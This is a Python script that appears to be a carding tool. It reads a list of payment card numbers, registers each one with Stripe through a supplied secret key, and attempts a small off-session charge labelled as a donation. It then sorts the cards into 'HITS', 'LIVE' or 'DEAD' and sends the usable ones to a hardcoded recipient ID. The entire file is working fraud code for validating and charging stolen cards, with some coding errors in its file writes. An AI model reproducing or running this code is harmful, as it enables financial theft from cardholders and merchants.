import requests
from extra import *
from termcolor import colored
import time
import json

inputs = input('Enter File Path : ')
sk = input('Enter Sk : ')
amt = input('Enter Amount : ')
currency = input('Enter Currency : ')

if int(amt) < 50:
    print('Amount must be *100 of the total amount\nIf your amount is $0.8 then put 80')
    exit()
if 'txt' not in inputs:
    file_open = inputs+'.txt'
else:
    file_open = inputs

with open(file_open,'r') as file:
    cards = file.read().split('\n')
    for card in cards:
     try:
        lista = card.split('|')
        start_time = time.time()
        id = ''
        while True:
            r1 = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                'type=card&card[number]='+lista[0]+'&card[exp_month]='+lista[1]+'&card[exp_year]='+lista[2],
                headers = {'Authorization': 'Bearer ' + sk}
            )       
            if 'rate_limit' in r1.text:
                continue 
            if 'pm' not in r1.text:
                end_time = time.time()
                total_time = end_time - start_time
                print(colored('\n[ ! ] # DEAD : '+card+'\n[ ! ] Result : '+json.loads(r1.text)['error']['message']+'\n[ ! ] Time : '+str(total_time), 'red'))
                break
                continue
            if 'pm' in r1.text:
                id = json.loads(r1.text)['id']
            break
        while True:
            r2 = requests.post(
                'https://api.stripe.com/v1/payment_intents',
                'amount='+amt+'&currency='+currency+'&payment_method_types[]=card&description=Kitten Crafts Donation&payment_method='+id+'&confirm=true&off_session=true',
                 headers = {'Authorization': 'Bearer ' + sk}
                )
            if 'rate_limit' in r2.text:
                continue
            end_time = time.time()
            total_time = end_time - start_time
            if 'succeeded' in r2.text or 'Payment complete' in r2.text or '"cvc_check": "pass"' in r2.text:
                output = '\n[ + ] # HITS : '+card+'\n[ + ] Result : 0.8$ CCN Charged ✅\n[ + ] Time : '+str(total_time)
                print(colored(output, 'green'))
                hit_sender(card, output, '766109755')
                with open('HITS.txt','r') as file:
                    file.write(card+'\n')
                    file.close()
                break
                continue    
            elif 'insufficient_funds' in r2.text or 'incorrect_cvc' in r2.text or 'invalid_account' in r2.text or 'transaction_not_allowed' in r2.text or 'authentication_required' in r2.text:
                output = '\n[ + ] # LIVE : '+card+'\n[ + ] Result : '+json.loads(r2.text)['error']['message']+' ✅\n[ + ] Time : '+str(total_time)  
                print(colored(output, 'green'))
                hit_sender(card, output, '766109755')
                with open('LIVE.txt','r') as file:
                    file.write(card+'\n')
                    file.close() 
                break
                continue       
            else:
                output = '\n[ ! ] # DEAD : '+card+'\n[ ! ] Result : '+json.loads(r2.text)['error']['message']+'\n[ ! ] Time : '+str(total_time)      
                print(colored(output, 'red'))  
                break
                continue     
     except Exception:
        pass
